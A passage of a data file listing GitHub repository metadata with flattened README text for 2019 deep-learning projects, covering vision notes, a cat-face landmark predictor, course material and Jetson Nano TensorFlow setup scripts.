javiabellan,vision,n/a,Vision Index Part 1 Deep Learning Part 1 Basics Classification classification Object detection object detection Segmentation segmentation Part 2 Video Understing Activity recognition activity recognition Object Tracking object tracking Product placement product placement Part 3 3D Understing SLAM slam 3D reconstruction 3d CapsuleNets Part 4 Generation Autoencoder GANs gans Part 5 Other Super resolution Colourisation Style Transfer Optical Character Recognition OCR ocr Image Matching SIFT image matching sift RANSAC Part 6 technical Loss functions loss functions Metrics metrics CNN explainability cnn explainability Image preprocessing image preprocessing Resources resources Part 1 Image theory Part 1 Deep Learning Convolutional Neural Network CNN posts 5 vision cnn md For fixed size oredered data like images Variable input size use adaptative pooling final layers then Option 1 AdaptiveAvgPool2d 1 1 Linear numfeatures numclasses less computation Option 2 Conv2d numfeatures numclasses 3 padding 1 AdaptiveAvgPool2d 1 1 To speed up jpeg image I O from the disk one should not use PIL skimage and even OpenCV but look for libjpeg turbo or PyVips Sota CNNs Small nets Useful for mobile phones SqueezeNet 2016 v1 0 58 108 v1 1 58 250 paper https arxiv org abs 1602 07360 Mobilenet v1 2017 69 600 The standard convolution is decomposed into two Accuracy similar to Resnet 18 paper https arxiv org abs 1704 04861 Shufflenet 2017 The most efficient net 67 400 paper https arxiv org abs 1707 01083 NASNet A Mobile 2017 74 080 paper https arxiv org abs 1707 07012 Mobilenet v2 2018 71 800 paper https arxiv org abs 1801 04381 SqueezeNext 2018 62 640 Hardware Aware Neural network design paper https arxiv org abs 1803 10615 Common nets Inception v3 2015 77 294 paper https arxiv org abs 1512 00567 blog https towardsdatascience com a simple guide to the versions of the inception network 7fc52b863202 Resnet 2015 Every 2 convolutions 3x3 3x3 sum the original input paper https arxiv org abs 1512 03385 Wide ResNet Resnet 18 70 142 Resnet 34 73 554 Resnet 50 76 002 SE ResNet50 77 636 SE ResNeXt50 32x4d 79 076 Resnet 101 77 438 SE ResNet101 78 396 SE ResNeXt101 32x4d 80 236 Resnet 152 78 428 SE ResNet152 78 658 Densenet 2016 Every 2 convolutions 3x3 1x1 concatenate the original input paper https arxiv org abs 1608 06993 DenseNet 121 74 646 DenseNet 169 76 026 DenseNet 201 77 152 DenseNet 161 77 560 Xception 2016 78 888 paper https arxiv org abs 1610 02357 ResNext 2016 paper https arxiv org abs 1611 05431 ResNeXt101 32x4d 78 188 ResNeXt101 64x4d 78 956 Dual Path Network DPN paper https arxiv org abs 1707 01629 DualPathNet98 79 224 DualPathNet925k 79 400 DualPathNet131 79 432 DualPathNet1075k 79 746 SENet 2017 Squeeze and Excitation network Net is allowed to adaptively adjust the weighting of each feature map in the convolution block paper https arxiv org abs 1709 01507 SE ResNet50 77 636 SE ResNet101 78 396 SE ResNet152 78 658 SE ResNeXt50 32x4d 79 076 USE THIS ONE FOR A MEDIUM NET SE ResNeXt101 32x4d 80 236 USE THIS ONE FOR A BIG NET Giants nets Useful for competitions Inception v4 80 062 Inception ResNet 80 170 paper https arxiv org abs 1602 07261 PolyNet 81 002 SENet 154 81 304 NASNet A Large 82 566 Crated with AutoML paper https arxiv org abs 1707 07012 PNASNet 5 Large 82 736 AmoebaNet 83 000 paper https arxiv org abs 1802 01548 CNN explainability link 1 https github com utkuozbulak pytorch cnn visualizations link 2 https ramprs github io 2017 01 21 Grad CAM Making Off the Shelf Deep Models Transparent through Visual Explanations html Features Average features on the channel axis This shows all classes detected 512 11 11 11 11 CAM Class Activation Map Final features multiplied by a single class weights and then averaged 512 11 11 512 11 11 paper https arxiv org abs 1512 04150 Grad CAM Final features multiplied by class gradients and the averaged paper https arxiv org abs 1610 02391 SmoothGrad paper https arxiv org abs 1706 03825 Extra Distill feature visualization https distill pub 2017 feature visualization Extra Distill building blocks https distill pub 2018 building blocks Libraries Captum https www captum ai by Pytorch Lucid https github com tensorflow lucid by Tensorflow Object detection Get bounding boxes Check detectron 2 https ai facebook com blog detectron2 a pytorch based modular object detection library Region based methods R CNN paper https arxiv org abs 1311 2524 Fast R CNN paper https arxiv org abs 1504 08083 Faster R CNN paper https arxiv org abs 1506 01497 Mask R CNN paper https arxiv org abs 1703 06870 Single shot methods YOLOv1 paper https arxiv org abs 1506 02640 SSD paper https arxiv org abs 1512 02325 YOLOv2 paper https arxiv org abs 1612 08242 YOLOv3 paper https pjreddie com media files papers YOLOv3 pdf Feature Pyramid Networks FPN 2016 paper https arxiv org abs 1612 03144 slides http presentations cocodataset org COCO17 Stuff FAIR pdf RetinaNet 2017 Focal Loss for Dense Object Detection paper https arxiv org abs 1708 02002 Path Aggregation Network 2018 paper https arxiv org abs 1803 01534 Segmentation https www jeremyjordan me semantic segmentation https www jeremyjordan me evaluating image segmentation models Check Res2Net https arxiv org abs 1904 01169 Check catalyst segmentation tutorial Ranger opt albumentations https colab research google com github catalyst team catalyst blob master examples notebooks segmentation tutorial ipynb scrollTo Zm7JsNrczOQG this repo https github com qubvel segmentationmodels Get pixel level classes Note that the model backbone can be a resnet densenet inception Name Description Date Instances FCN Fully Convolutional Network 2014 SegNet https arxiv org abs 1511 00561 Encoder decorder 2015 Unet https arxiv org abs 1505 04597 Concatenate like a densenet 2015 ENet https arxiv org abs 1606 02147 Real time video segmentation 2016 PSPNet https arxiv org abs 1612 01105 Pyramid Scene Parsing Net 2016 FPN https arxiv org abs 1612 03144 Feature Pyramid Networks 2016 Yes DeepLabv3 https arxiv org abs 1706 05587 Increasing dilatation field of view 2017 LinkNet https arxiv org abs 1707 03718 Adds like a resnet 2017 PANet https arxiv org abs 1803 01534 Path Aggregation Network 2018 Yes Feature Pyramid Networks FPN slides http presentations cocodataset org COCO17 Stuff FAIR pdf Depth segmentation Learning the Depths of Moving People by Watching Frozen People mannequin challenge paper https arxiv org abs 1904 11111 Surface normal segmentation paper https arxiv org abs 1411 4958 2014 GANs Reference Check this kaggle competition https www kaggle com c generative dog images Fast ai decrappify DeOldify https www fast ai 2019 05 03 decrappify Applications Image to image problems Super Resolution Black and white colorization Colorful Image Colorization https arxiv org abs 1603 08511 2016 DeOldify https github com jantic DeOldify 2018 SotA Decrappification Artistic style Data augmentation New images From latent vector From noise image Training 0 Generate labeled dataset Edit ground truth images to become the input images This step depend of the problem input data could be crappified black white noise vector 1 Train the GENERATOR most of the time Model UNET with pretrained ResNet backbone self attention spectral normalization Loss Mean squared pixel error or L1 loss Better Loss Perceptual Loss aka Feature Loss 2 Save generated images 3 Train the DISCRIMINATOR aka Critic with real vs generated images Model Pretrained binary classifier spectral normalization 4 Train BOTH nets ping pong with 2 losses original and discriminator With a NoGAN approach this step is very quick a 5 of the total training time more o less With a traditional progressively sized GAN approach this step is very slow If train so much this step you start seeing artifacts and glitches introduced in renderings Tricks Self Attention GAN SAGAN https arxiv org abs 1805 08318 For spatial coherence between regions of the generated image Spectral normalization Video pix2pixHD COVST Naively add temporal consistency Video to Video Synthesis https tcwang0509 github io vid2vid GANs order chronologically Paper Name Date Creator GAN https arxiv org abs 1406 2661 Generative Adversarial Net Jun 2014 Goodfellow CGAN https arxiv org abs 1411 1784 Conditional GAN Nov 2014 Montreal U DCGAN https arxiv org abs 1511 06434 Deep Convolutional GAN Nov 2015 Facebook GAN v2 https arxiv org abs 1606 03498 Improved GAN Jun 2016 Goodfellow InfoGAN https arxiv org abs 1606 03657 Jun 2016 OpenAI CoGAN https arxiv org abs 1606 07536 Coupled GAN Jun 2016 Mitsubishi Pix2Pix https arxiv org abs 1611 07004 Image to Image Nov 2016 Berkeley StackGAN https arxiv org abs 1612 03242 Text to Image Dec 2016 Baidu WGAN https arxiv org abs 1701 07875 Wasserstein GAN Jan 2017 Facebook CycleGAN https arxiv org abs 1703 10593 Cycle GAN Mar 2017 Berkeley ProGAN https arxiv org abs 1710 10196 Progressive growing of GAN Oct 2017 NVIDIA SAGAN https arxiv org abs 1805 08318 Self Attention GAN May 2018 Goodfellow BigGAN https arxiv org abs 1809 11096 Large Scale GAN Training Sep 2018 Google StyleGAN https arxiv org abs 1812 04948 Style based GAN Dec 2018 NVIDIA 2014 GAN 2015 DCGAN 2016 CoGAN 2017 ProGAN 2018 StyleGAN img gan progress jpg GANS order by type Better error function LSGAN https arxiv org abs 1611 04076 RaGAN https arxiv org abs 1807 00734 GAN v2 Feature Matching https arxiv org abs 1606 03498 CGAN Only one particular class generation instead of blurry multiclass InfoGAN Disentaged representation Dec 2016 OpenAI CycleGAN Domain adaptation Oct 2017 Berkeley SAGAN Self Attention GAN May 2018 Google Relativistic GAN Rethinking adversary Jul 2018 LD Isntitute Progressive GAN One step at a time Oct 2017 NVIDIA DCGAN Deep Convolutional GAN Nov 2016 Facebook BigGAN SotA for image synthesis Same GAN techiques but larger Increase model capacity batch size BEGAN Balancing Generator May 2017 Google WGAN Wasserstein GAN Learning distribution Dec 2017 Facebook VAEGAN Improving VAE by GANs Feb 2016 TU Denmark SeqGAN Sequence learning with GANs May 2017 Shangai Univ Product placement Technology Background foreground segmentation so images simply slide behind objects in the front zone Optical flow analysis helps determine the overall movement of virtual ads Planar tracking helps smooth positioning Image color adjustment is optimized according to the environment Papers CASE dataset paper https arxiv org abs 1903 08943 ALOS dataset paper https arxiv org abs 1904 07776 Identifying Candidate Spaces with CASE ds paper https arxiv org abs 1910 03227 Companies Mirriad https www mirriad com Swappear http www swappear com Loss functions Segmentation Usually Loss IoU Dice 0 8 BCE Pixel wise cross entropy each pixel individually comparing the class predictions depth wise pixel vector IoU F0 Pred GT Pred GT TP TP FP FN Dice F1 2 Pred GT Pred GT 2TP 2TP FP FN Range from 0 worst to 1 best In order to formulate a loss function which can be minimized we ll simply use 1 Dice Generation Pixel MSE Flat the 2D images and compare them with regular MSE Discriminator Critic The loss function is a binary classification pretrained resnet real fake Feature losses or perpetual losses Image preprocessing Normalization 1 Mean subtraction Center the data to zero x x x mean fights vanishing and exploding gradients 2 Standardize Put the data on the same scale x x x std improves convergence speed and accuracy PCA and Whitening 1 Mean subtraction Center the data in zero x x x mean 2 Decorrelation or PCA Rotate the data until there is no correlation anymore 3 Whitening Put the data on the same scale whitened decorrelated np sqrt eigVals 1e 5 ZCA Whitening with Zero component analysis ZCA is a very similar process Subtract Local Mean CLAHE Contrast Limited Adaptive Histogram Equalization Dicom Some DICOM gotchas to be aware of fastai https www kaggle com jhoward some dicom gotchas to be aware of fastai DON T see like a radiologist fastai https www kaggle com jhoward don t see like a radiologist fastai Part 2 Traditional vision Image Matching SIFT Check this article https www analyticsvidhya com blog 2019 10 detailed guide powerful sift technique image matching python Resources A year in computer vision Part 1 https towardsdatascience com a year in computer vision part 1 of 4 eaeb040b6f46 Part 2 https towardsdatascience com a year in computer vision part 2 of 4 893e18e12be0 Part 3 https towardsdatascience com a year in computer vision part 3 of 4 861216d71607 Part 4 https towardsdatascience com a year in computer vision part 4 of 4 515c61d41a00 Others Inceptionism Capsule net pyimagesearch Start here https www pyimagesearch com start here GANs 10 types of GANs https amp reddit com r MachineLearning comments 8z97mx rmathinsightsfrom10ganpapersinfogans floydhub GANs the Story So Far https blog floydhub com gans story so far infoGAN http www depthfirstlearning com 2018 InfoGAN Pretrained models in pytorch https github com Cadene pretrained models pytorch Ranking https openreview net pdf id Hyzq4ZKa97 comparison paper https arxiv org pdf 1810 00736 pdf Little tricks paper https arxiv org abs 1812 01187 GPipe https arxiv org pdf 1811 06965v4 pdf,2019-09-29T11:23:20Z,2019-11-07T13:16:23Z,n/a,javiabellan,User,1,1,0,41,master,javiabellan,1,0,0,0,0,0,0
PabloRR100,NLP,n/a,,2019-10-22T10:55:41Z,2019-12-14T16:19:40Z,Jupyter Notebook,PabloRR100,User,1,1,0,105,master,PabloRR100,1,0,0,1,0,1,0
anish9,Image-Auto-Enhancer,n/a,Auto enhance Version 1 0 Deep Learning Image Auto Enhancer Requirements Python3 6 Tensorflow 1 12 openCV Some Results Testing The pretrained model is available on MODEL folder Lightweight to test python3 demo py INPUTS IA1 jpg outputs are saved at OUTPUTS folder To do DATASETUPDATES HDR Human subjects Pet subjects Optimization Hyper saturation fixes,2019-10-25T20:40:39Z,2019-11-26T08:04:23Z,Python,anish9,User,1,1,0,15,master,anish9,1,0,0,0,0,0,0
nandini-sundar,cs230-waste-classification-and-detection,n/a,CS230 Waste Classification and Localization with Deep Learning,2019-10-20T17:04:53Z,2019-12-09T16:30:29Z,Jupyter Notebook,nandini-sundar,User,2,1,0,16,master,nandini-sundar#hnkulkarni,2,0,0,1,0,1,2
gamchanr,TA-EE4178,n/a,EE 4178 2019 Fall Deep Learning with Python Francois Chollet https www pdfdrive com deep learning with python e54511249 html Python 3 6 Python 3 5 https wikidocs net book 1 Python basic https wikidocs net book 1553 https dojang io course view php id 7 PyTorch 1 3 PyTorch 1 2 https pytorch org Google Colab https colab research google com notebooks welcome ipynb https drive google com open id 11B7cjkW0KVMZv yqxHDhg0TUE3CESYSx Table of Contents 1 Basics PyTorch Google Colab https nbviewer jupyter org github gamchanr TA EE4178 blob master 01 basics intropytorch intropytorch ipynb Full Code https github com gamchanr TA EE4178 blob master 01 basics intropytorch intropytorch py Binary Classification XOR https nbviewer jupyter org github gamchanr TA EE4178 blob master 01 basics classification classification ipynb Full Code https github com gamchanr TA EE4178 blob master 01 basics classification binaryclassification xor py IMDB Face Recognizer Multi class Classification MNIST https nbviewer jupyter org github gamchanr TA EE4178 blob master 01 basics classification classification ipynb border1 Full Code https github com gamchanr TA EE4178 blob master 01 basics classification multiclassclassification mnist py Linear Regression Boston Housing Price Log Regression 2 Intermediate CNN Convolutional Neural Network MNIST https nbviewer jupyter org github gamchanr TA EE4178 blob master 02 intermediate CNN cnn ipynb flushcache true Full Code Train https github com gamchanr TA EE4178 blob master 02 intermediate CNN cnn py Full Code Test https github com gamchanr TA EE4178 blob master 02 intermediate CNN test py CIFAR 10 https github com gamchanr TA EE4178 blob master 02 intermediate CNN cifar10 py RNN Recurrent Neural Network MNIST https github com gamchanr TA EE4178 blob master 02 intermediate RNN RNN ipynb Full Code https github com gamchanr TA EE4178 blob master 02 intermediate RNN rnn py Stytle Transfer VAE Varialtional Auto Encoder https github com gamchanr TA EE4178 blob master 02 intermediate VAE VAE ipynb Full Code https github com gamchanr TA EE4178 blob master 02 intermediate VAE train py GAN Generative Adversarial Networks 3 Advanced Custom Dataloader https github com gamchanr TA EE4178 blob master 03 advanced customdataloader customdataloader ipynb Full Code https github com gamchanr TA EE4178 blob master 03 advanced customdataloader fontdataset py Trasfer Learning Using Pre trained Model to Custom Case https github com gamchanr TA EE4178 blob master 03 advanced transferlearning transferlearning ipynb Full code https github com gamchanr TA EE4178 blob master 03 advanced transferlearning posttrain py custom data https github com gamchanr TA EE4178 blob master 03 advanced transferlearning cnn py pre trained model https github com gamchanr TA EE4178 blob master 03 advanced transferlearning cnn py Model Customizing base on Existing Model 4 Experts Paper Implemention Custom Modeling Pytorch for Mobile ios android https hackernoon com binary face classifier using pytorch 2d835ccb7816 https m blog naver com PostView nhn blogId gkvmsp logNo 221485860027 proxyReferer https 3A 2F 2Fwww google com 2F cf Training Tips Train Val Test Overfitting Underfitting Data Augmentation Final Project 1 https drive google com open id 1VYOuNUQQynr9hX2WcEqzAGGCBl5vukRH 2 train https drive google com open id 1Gx 1Gj3YLR7r4kYIMDJMnF1GtKYPMvbQ validation https drive google com open id 1T8KSOgAVpKsJFWgNMeVfLgTnKQSp1VeB test https drive google com open id 1b5 v3h EIqO00vel7MRSTucGp856BymK 3 fontdataset py https github com gamchanr TA EE4178 blob master utils fontdataset py GPU Colab GPU 5 NVIDIA Tesla K80 P100 P4 T4 V100 GPU GPU GPU GPU GPU train ipynb ex Tesla T4 2 003 1 GPU Colab GPU NVIDIA Tesla K80 P100 P4 T4 V100 GPU nvidia smi 2 import time starttime time time time sleep 2 duration time time starttime print duration 2 003,2019-10-06T11:08:43Z,2019-12-13T05:50:36Z,Jupyter Notebook,gamchanr,User,2,1,0,136,master,gamchanr,1,0,0,0,0,0,0
devdynam0507,AutoGrowupCharactorSimulator,n/a,AutoGrowupCharactorSimulator Deep learning auto grow up my charactor simulation,2019-10-17T17:25:27Z,2019-11-02T12:49:42Z,Java,devdynam0507,User,1,1,0,3,master,devdynam0507,1,0,0,0,0,0,0
dev-wei,recman,deep-interest-network#deep-learning#deepfm#factorization-machine#machine-learning#recommendation-system#xdeepfm,Recman this is the man for making recommendations Papers Citations DeepFM A Factorization Machine based Neural Network for CTR Prediction https arxiv org abs 1703 04247 Deep Cross Network for Ad Click Predictions https arxiv org pdf 1708 05123 pdf xDeepFM Combining Explicit and Implicit Feature Interactions for Recommender Systems https arxiv org pdf 1803 05170 pdf ON LARGE BATCH TRAINING FOR DEEP LEARNING GENERALIZATION GAP AND SHARP MINIMA https arxiv org pdf 1609 04836 pdf,2019-09-25T02:58:23Z,2019-11-20T16:09:12Z,Python,dev-wei,User,0,1,0,12,master,dev-wei,1,0,0,0,0,0,0
robintwhite,DL4CV,n/a,DL4CV Deep Learning for Computer Vision code base Code generated during my practice with Adrian Rosebrock s Deep Learning for Computer Vision ImageNet bundle,2019-09-27T02:32:04Z,2019-11-18T21:13:36Z,Python,robintwhite,User,1,1,0,7,master,robintwhite,1,0,0,0,0,0,0
nessessence,stockPricePrediction,stock#stock-market#stock-price-prediction#stock-trading,Stock Prediction using Deep learning Dataset Downjones30 https yhoo it 2NaWIJY Nikkei https yhoo it 2Nzq8AM Feature engineering SMA Join 2 markets model structure baseline model https github com nessessence MultimodelStockPrediction blob master baseline ipynb 2 layers of LSTM no feature engineering using Downjones30 above model no feature engineering using Downjones30 above model with feature engineering https github com nessessence MultimodelStockPrediction blob master modelFE ipynb use above feature engineering useful resources latest advancements in deep learning to predict stock price movements https bit ly 2C98uOM AIAlpha Using machine learning to predict stocks https bit ly 2PG8SMM,2019-11-01T07:20:53Z,2019-12-13T06:17:52Z,Jupyter Notebook,nessessence,User,0,1,0,97,master,nessessence#thanit456#sprkzoff,3,0,0,2,0,0,0
zylamarek,frederic,n/a,Introduction I was looking for a cat face landmark predictor to use in one of my projects After a quick search I realized there is no out of the box solution with a high enough accuracy The closest I found was cathipsterizer https github com zylamarek cathipsterizer I tested the predictor included in the repo and decided its accuracy needs some improvement This is how frederic was born The predictor consists of two models stacked on each other The first one predicts the ROI bounding box and the second one detects landmarks inside the ROI The detected landmarks are then translated into the original image I train the models on an improved version of cat dataset https github com zylamarek cat dataset The predictor assumes that there is one and only one cat in the picture graphics frederic jpg graphics fredericpredicted jpg Fryderyk the cat behind the name of this project Predicted landmarks are presented as yellow dots 0 right eye 1 left eye 2 mouth 3 right ear 4 left ear Installation Frederic hasn t been distributed as a package so the only way to use it at least for now is to get a copy of this repo by either git clone or download It requires keras and Pillow in order to run You may use the convenience scripts provided winstall bat on Windows or install sh on Linux They will create a new conda environment with all the necessary packages installed You may want to adjust the keras version GPU vs CPU and CUDA version that is supported by your system You can get Miniconda from here https docs conda io en latest miniconda html Then you need to make sure that frederic can be found by your interpreter One way to achieve it is to set the PYTHONPATH environment variable set PYTHONPATH C pathtofrederic on Windows or export PYTHONPATH path to frederic on Linux Usage Once frederic is successfully installed you can run this example python import frederic imgpath path to an image jpg img frederic loadimage imgpath predictor frederic Predictor landmarks predictor predict img frederic savelandmarks landmarks imgpath cat frederic drawlandmarks img landmarks frederic saveimage img imgpath landmarks png The above code will load an image predict landmarks save them in a cat file and save a copy of the image with landmarks drawn in it Running the predictor for the first time will also download the necessary trained models and store them in keras cache Please note that loading the models is a relatively expensive operation In the above example the models are loaded only when the predict method is called not when the predictor is created You can control this behavior with the lazy parameter of the constructor With lazy False the models are loaded upon predictor creation so the consequent call to predict method will happen without delay Performance An average error of each landmark along any axis is 2 07 pixels or 1 6 of a cat face size The first table presents the performance of the whole pipeline MAE and RMSE values are expressed in pixels MSE in pixels squared MAPE and RMSPE in percent Percentage values were obtained by dividing each error by the length of the longer edge of the bounding box of the given face Whole pipeline train validation test MAE 1 59 2 09 2 07 MSE 13 24 17 87 76 23 RMSE 3 64 4 23 8 73 RMSPE 8 50 3 22 20 32 MAPE 0 81 1 11 1 60 MAPE eyes 0 71 0 78 1 28 MAPE mouth 0 74 0 95 1 37 MAPE ears 0 96 1 52 2 04 Images below show examples of predicted landmarks with MAPE close to 1 6 average error of the whole pipeline graphics 1 58281892400001472019 jpg graphics 1 61153217800001395015 jpg graphics 1 61164258900001425023 jpg graphics 1 64617546300001385011 jpg Examples of predicted landmarks with MAPE close to 1 6 Ground truth landmarks are presented in red and predicted landmarks in yellow Landmarks are labeled 0 right eye 1 left eye 2 mouth 3 right ear 4 left ear We can see that RMSPE is much higher than MAPE This happens because RMSPE punishes large errors incomparably more than the small ones The image below presents the worst prediction in the test set Indeed MAPE in this case equals to 720 the second worst one is 36 Due to a terribly wrong ROI prediction the landmarks are off by a huge margin Interestingly this single image has a huge influence on the total metrics If we removed this image completely from the test set MAPE drops down to 1 05 from 1 6 and RMSPE to 2 62 from 20 32 graphics 719 892645700CAT0600001440008 jpg The worst prediction in the test set The table below depicts results of the bounding box ROI prediction model MSE RMSE MAE and MAPE were computed for two points top left and bottom right corner of the bounding box Intersection over union IoU of the predicted and ground truth boxes is presented in percent Bounding box train validation test IoU 94 38 93 72 93 88 MAE 0 91 1 59 1 68 MAPE 1 50 1 62 2 06 MSE 2 51 9 15 20 29 RMSE 1 58 3 02 4 50 The last table shows the performance of the landmarks inside ROI predictor The scores were computed using the ground truth bounding boxes Landmarks train validation test MAE 1 29 1 59 1 55 MAPE 0 69 0 86 0 84 MSE 2 97 6 79 7 71 RMSE 1 72 2 61 2 78 Training To train the models yourself you should first get a copy of augmented cat dataset https github com zylamarek cat dataset Move the data into the parent directory of your frederic copy or adjust the data path in the script Then run hpsearch bat on Windows or hpsearch sh on Linux This will train new models and place them in the tools models directory In order to use your models for prediction you can pass the path in the Predictor construction call e g python predictor frederic Predictor bboxmodelpath path to models 2019 10 0711 35 58iou h5 landmarksmodelpath path to models 2019 10 0412 56 47mse h5 Structure The predictor consists of two models ROI predictor and landmarks inside ROI predictor Both models have similar structure They accept 224x224 RGB images as inputs These are fed into a keras implementation https github com JonathanCMitchell mobilenetv2keras of MobileNetV2 https arxiv org abs 1801 04381 pretrained on imagenet The fully connected layer on top is discarded and global max pooling is applied The resulting vector of 1280 numbers is then passed to two stacked fully connected layers with relu nonlinearity and 128 units each The last dense output layer applies no nonlinearity The difference between the models is the size of the output 4 or 14 for bounding box prediction and 10 for landmark prediction Training the bounding box predictor with MSE loss renders decent results Using IoU loss defined as 1 IoU increases the performance but is unstable in the beginning of the training To mitigate this issue I first train the model with MSE loss for a couple of batches and then switch to IoU I also tried training using joined loss of IoU and MSE of landmarks in hope of achieving higher accuracy and stabilizing the process but neither actually happened BTW that explains the size of the output being 14 4 for bounding box 10 for landmarks The landmarks predictor is trained with MSE loss Both models are trained using Adam optimizer which does a great job in this setting During training the data is augmented with horizontal flipping rotation and cropping The last part turned out to be the most beneficial as it allowed to feed the network with scale balanced images I defined scale as a ratio between the longer bounding box edge and the longer picture edge The figures below show the distributions of scales during training using different cropping solutions Random rotation 15 degrees was also applied in all cases You can see that the dataset is highly imbalanced with most pictures scaled between 0 1 and 0 5 Random crop without extending the image is still imbalanced Forcing the uniform distribution and extending the image with a black background does not improve the performance much The last solution is the most interesting It is rather a hack than a proper technique and it works only with this particular data However it brought a high accuracy gain graphics rotate15nocrop png No crop graphics rotate15crop png Random crop not extending the image graphics rotate15cropscalebalancedblack png Random crop with uniform distribution of scales extending the image with black background if necessary graphics rotate15cropscalebalanced png Random crop with close to uniform distribution of scales not extending the image I tried applying a couple of ideas to improve the results but they didn t bring any performance gains I describe them below Authors of this paper https arxiv org abs 1905 00641 report that including landmarks information in training improves face detection I tried including landmarks in the loss function together with the bounding box data but it failed to boost the accuracy In the same paper authors use landmarks normalization based on the center of the anchor I tried normalizing the landmarks around the center of the face but it didn t improve the performance The output of the network is a number between 0 and 224 most of the cases some landmarks lay outside of the image I tried scaling the output to different ranges 01 11 0 50 5 0 250 75 with linear or sigmoid tanh functions but I was unable to achieve a higher score I tried including this implementation https github com bojone keraslookahead of Lookahead https arxiv org abs 1907 08610 and this implementation https github com CyberZHG keras radam of Rectified Adam https arxiv org abs 1908 03265 Neither of them was able to improve the results Utilizing DenseNet121 https arxiv org abs 1608 06993 instead of much smaller MobileNetV2 did not increase the accuracy It actually rendered similar results Using float outputs instead of integers resulted in a slightly worse performance Training with RMSprop SGD or Adam with differential learning rates led to a lower performance,2019-10-30T17:50:41Z,2019-11-05T19:21:36Z,Python,zylamarek,User,1,1,0,53,master,zylamarek,1,0,0,1,0,1,0
kittinan,thai-name-gender-classifier,n/a,thai name gender classifier Thai name gender classifier with Deep learning TODO,2019-10-06T13:59:51Z,2019-10-07T16:01:17Z,Jupyter Notebook,kittinan,User,1,1,0,7,master,kittinan,1,0,0,0,0,0,0
fdasilva59,DeepNano,edgetpu#gpu-tensorflow#jetson-nano#nvidia#tensorflow#tensorflow-lite#tensorflow2,DeepNano This project aims to provide a couple of script to automate the setup of a Jetson Nano for Deep Learning at Edge with Tensorflow The scripts will Update the system Create a Python3 6 virtual environment and install usefull packages Install Visual Studio Install the Coral TPU Edge Build and Install Bazel in order to build Tensorflow Build and Install Tensorflow 2 0 for Jetson Nano aarch64 with CUDA support Be aware that the setup can takes 1 2 days if compiling bazel and Tensorflow a bit more than 1 day just to compile Tensorflow natively on the Jetson Nano Cross compiling might be considered to speed up the compilation from sources Prerequisites Install a Fan on the Jetson Nano in order operate at max power Download and install the Jetson Nano Developer Kit SD Card Image with JetPack 4 2 2 https developer nvidia com embedded downloads tx product jetsonnano on a 64GB SD Card Boot on the Jeston Nano with this SD card Make sure to power the Nano with a 4A power supply in order to operate in power mode0 MAXN How to use 1 Clone this github project 2 If you have already built a binary for Bazel and a Python wheel for Tensorflow restore them at the following locations You may also download my builds in the release section https github com fdasilva59 DeepNano releases tag 2 0 0 usr local bin bazel opt local tmp tensorflowpkg tensorflow 2 0 0 cp36 cp36m linuxaarch64 whl 3 Review the script and eventually customize the installation 4 During the script execution make sure to close all applications except the Terminal to run the script During the tensorflow compilation almost all the RAM Swap memory will be used Using other applications might cause a crash 5 Execute the script NanoSetup sh to configure the system on the SD card 6 Make sure that that only one single USB drive is connected to the Jetson Nano Then execute the script Move2USB sh to copy the system on the USB SSD drive and update the system to boot from it Note You might want to reuse this script in the future in order to refresh your USB SSD drive with a fresh copy of the system located on the SD Card When using the Nano make sure To execute your Tensorflow code inside the Python Virtual Environment If you want to launch Jupyter Lab notebooks first start the Chromium browser with the no sandbox or disable gpu option Manually using Jupyter Labd on the Jetson Nano opt local virtual env bin activate bash chromium browser no sandbox jupyter lab log level ERROR For convenience an alias jl has been define in the bashrc alias jl chromium browser no sandbox jupyter lab log level ERROR Jupyter Notebook experiments Work In progress A Jupyter Notebook is provided to experiment with Tensorflow 2 0 on the Jetson Nano and Coral Edge TPU This notebook does not aim to serve as a benchmark It is intended at exploring the possibilities capabilities with this setup It can also serves as a quick reference guide for using the tf lite API Also remember that these devices are intended for inference They are not designed for training That being said the Jetson Nano is not bad at training a rather basic Neural network Copyright acknowledgements and usefull links MIT License Nvidia forum discussion on buildling Tensorflow from sources 1 https devtalk nvidia com default topic 1055131 jetson agx xavier building tensorflow 1 13 on jetson xavier Nvidia forum discussion on buildling Tensorflow from sources 2 https devtalk nvidia com default topic 1049100 general tensorflow installation on drive px2 post 5324624 5324624 Nvidia forum discussion on buildling Tensorflow from sources 3 https devtalk nvidia com default topic 1055378 building tensorflow lite from source on tx2 failed Nvidia forum discussion on Jupyter lab error https devtalk nvidia com default topic 1052333 jetson tx2 error can t initialize nvrm channel post 5350512 5350512 Nvidia forum discussion on compiling options https devtalk nvidia com default topic 1028179 jetson tx2 gcc options for tx2 post 5230415 5230415 GCC options for ARM https gcc gnu org onlinedocs gcc 7 4 0 gcc ARM Options html ARM Options Jetsonhacks tutorials ressources https www jetsonhacks com category jetson nano Jetsonhacks tutorial to install a Fan https www jetsonhacks com 2019 09 08 jetson nano add a fan Jetsonhacks tutorial to run from a USB drive https www jetsonhacks com 2019 09 17 jetson nano run from usb drive Jetsonhacks tutorial to install a Swap File https github com JetsonHacksNano installSwapfile Jetsonhacks tutorial to install Visual Studio editor https github com JetsonHacksNano installVSCode Headmelted Visual Studio Code for ARM platform https code headmelted com Headmelted github code https github com headmelted codebuilds blob master docs installers apt sh Tensorflow Lite Python Quickstart https www tensorflow org lite guide python tensorflow Post training Quantization https www tensorflow org lite performance posttrainingquantization Inference on Coral TPU Edge with TensorFlow Lite in Python https coral withgoogle com docs edgetpu tflite python My Hardware setup TODO add screenshots Nvidia Jetson Nano https developer nvidia com embedded jetson nano developer kit Samsung 64GB Micro SD https www amazon com Samsung MicroSDXC Memory Adapter MB MC64GA dp B06XFWPXYD ref sr13 5v 4A power supply Adjust to your region https www amazon fr TOP CHARGEUR Adaptateur Alimentation Certification dp B07PM41CNR ref sr11 Google Coral TPU Edge https coral withgoogle com Noctua NF A4x20 5V PWM Fan https www amazon com Noctua NF A4x20 5V PWM Premium Quality dp B071FNHVXN ref sr11sspa Intel Dual Band Wireless AC8265 https www amazon com Wireless Intel 8265NGW Bluetooth Wireless dp B0721MLM8B ref sr12 Wifi Antenna https www amazon com WayinTop Wireless Network Antenna Pigtail dp B07PHFL663 ref sr14 Samsung 250GB SSD T5 https www amazon com Samsung Portable MU PA250B AM Alluring dp B073H552FK ref sr13 Raspberry Pi v2 8MP camera https www amazon com Raspberry Pi Camera Module Megapixel dp B01ER2SKFS ref sr11 Waveshare Jetson Nano case https www amazon com Case Jetson Nano Compatible Peripherals dp B07VTNSS4S ref sr11 2 x USB 3 0 to type C angle cable https www amazon com BSHTU Extension Transfer Charger 90 C2 B0Type dp B077M8DHDT ref sr113 and of course a Monitor a Keyboard and a 